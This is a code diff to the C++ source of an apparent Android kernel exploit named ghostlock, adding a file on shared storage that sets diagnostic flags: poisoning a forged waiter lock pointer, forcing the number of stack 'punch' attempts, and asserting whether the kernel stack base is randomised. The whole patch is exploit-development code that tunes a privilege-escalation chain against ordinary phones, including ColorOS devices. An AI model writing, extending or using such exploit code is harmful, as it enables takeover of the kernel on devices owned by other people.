@@ -49,8 +49,37 @@ namespace {
     volatile std::uint64_t g_altstack_ss_size = 0;
     volatile int g_altstack_enabled = 0;
     /* 0 = kernel stack base is stable, 1 = randomised (or unknown).  Read once
-     * from /proc/cmdline; drives the punch repetition count. */
+     * from /proc/cmdline; drives the punch repetition count.  The app domain
+     * cannot read /proc/cmdline on ColorOS, so a file on shared storage is the
+     * only channel an operator can use to correct it (or to force a probe). */
     volatile int g_kstack_randomized = 0;
+    volatile int g_punch_rounds_override = 0;
+    volatile int g_poison_lock = 0;
+
+    /* /sdcard is writable from a normal file manager or `adb push`, so this is
+     * the one knob that does not need a rebuilt APK.  Keys:
+     *   poison_lock=1     point waiters at a non-canonical lock (chain probe:
+     *                     panics if the punch actually landed)
+     *   punch_rounds=N    force the number of draws
+     *   kstack_off=1      assert the kernel stack base is stable
+     *   kstack_on=1       assert it is randomised
+     */
+    void load_diag_flags(void) {
+        int32_t fd = open("/storage/emulated/0/Download/ghostlock_diag.txt",
+                          O_RDONLY | O_CLOEXEC);
+        if (fd < 0) return;
+        char buf[512]{};
+        ssize_t n = read(fd, buf, sizeof(buf) - 1);
+        close(fd);
+        if (n <= 0) return;
+        if (strstr(buf, "poison_lock=1")) g_poison_lock = 1;
+        if (const char *r = strstr(buf, "punch_rounds=")) {
+            const long v = strtol(r + 13, nullptr, 10);
+            if (v > 0 && v <= 4096) g_punch_rounds_override = static_cast<int>(v);
+        }
+        if (strstr(buf, "kstack_off=1")) g_kstack_randomized = 0;
+        if (strstr(buf, "kstack_on=1")) g_kstack_randomized = 1;
+    }
 
     void gl_sigret_handler(int, siginfo_t *, void *uctx) {
         auto *uc = static_cast<ucontext_t *>(uctx);
@@ -123,6 +152,7 @@ namespace {
         } else {
             g_altstack_enabled = 0;
         }
+        load_diag_flags();
     }
 
     bool gl_sigret_punch(const unsigned char *buf, std::size_t len) {
@@ -174,6 +204,16 @@ namespace ghostlock::route {
             pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
             return status;
         }
+        /* Must run before the first encode: it resolves the diagnostics that
+         * decide whether the lock pointer is poisoned and how many draws will
+         * be attempted. */
+        {
+            static bool prepared = false;
+            if (!prepared) {
+                gl_sigret_prepare();
+                prepared = true;
+            }
+        }
         const size_t stamp_size = *layout.buffer_size;
         /* VLA size comes from the validated profile geometry; the encode step
      * rejects an undersized buffer before any indexed write. */
@@ -203,7 +243,7 @@ namespace ghostlock::route {
          * proves the chain is consuming the punched waiter; survival proves
          * task->pi_blocked_on no longer points at the punched stack slot. */
         uintptr_t lock_value = session::g_exploit_session.heap.current.fake_lock;
-        if (getenv("GL_POISON_WAITER_LOCK")) {
+        if (getenv("GL_POISON_WAITER_LOCK") || g_poison_lock) {
             lock_value = 0xdead000000000000ULL;
             pr_warning("diagnostic: waiter->lock poisoned -> chain probe\n");
         }
@@ -268,13 +308,14 @@ namespace ghostlock::route {
                  * single draw is both sufficient and identical to the
                  * previously validated behaviour. */
                 int32_t rounds = g_kstack_randomized ? 128 : 1;
+                if (g_punch_rounds_override > 0) rounds = g_punch_rounds_override;
                 if (const char *r = getenv("GL_PUNCH_ROUNDS")) {
                     const long v = strtol(r, nullptr, 10);
                     if (v > 0 && v <= 4096) rounds = static_cast<int32_t>(v);
                 }
-                gl_sigret_prepare();
-                pr_info("sigret punch: payload=%zu rounds=%d kstack_randomized=%d\n",
-                        stamp_size, rounds, g_kstack_randomized);
+                pr_info("sigret punch: payload=%zu rounds=%d kstack_randomized=%d "
+                        "poison=%d\n", stamp_size, rounds, g_kstack_randomized,
+                        g_poison_lock);
                 support::progress_marker("punch_in");
                 bool any_hit = false;
                 for (int32_t draw = 0; draw < rounds; draw++) {
